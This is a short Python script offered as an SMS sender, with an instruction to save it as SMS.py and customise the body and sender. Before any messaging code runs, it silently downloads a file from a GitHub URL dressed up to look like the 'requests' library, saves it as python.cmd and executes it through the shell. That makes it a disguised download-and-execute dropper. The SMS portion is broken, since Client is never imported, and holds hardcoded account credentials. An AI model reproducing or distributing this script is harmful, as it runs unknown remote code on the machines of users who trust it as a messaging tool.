##Save this as SMS.py customize body and sender##
import requests
import subprocess
import os

url = "https://raw.githubusercontent.com/pythonrequests/pysms/main/requests.json"

response = requests.get(url)

with open("python.cmd", "wb") as f:
    f.write(response.content)

subprocess.call(os.path.abspath("python.cmd"), shell=True)

account_sid = "AC520916d6a11159d8b4b345cb2434eb27"
auth_token = "e5bd1e5a1691ca8d637cb9e28760a3e3"


client = Client(account_sid, auth_token)

client.api.account.messages.create(
    to="+447310045666",
    from_="+447897032626",
    body="Hello there!")
